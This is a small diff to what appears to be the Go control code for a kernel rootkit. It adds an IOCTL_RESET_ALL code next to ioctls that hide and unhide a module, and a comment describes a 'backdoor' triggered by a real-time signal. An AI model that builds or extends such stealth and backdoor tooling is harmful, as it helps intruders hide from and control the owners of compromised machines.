@@ -36,6 +36,7 @@ var (
 	IOCTL_MODULE_HIDE    = _IO(magic, 0x0D)        // 0xC00D
 	IOCTL_MODULE_UNHIDE  = _IO(magic, 0x0E)        // 0xC00E
 	IOCTL_GET_STATS      = _IOR(magic, 0x0F, 4096) // 0x9000C00F
+	IOCTL_RESET_ALL      = _IO(magic, 0x10)        // 0xC010
 )
 
 // MagicSignal is the real-time signal the backdoor listens for.
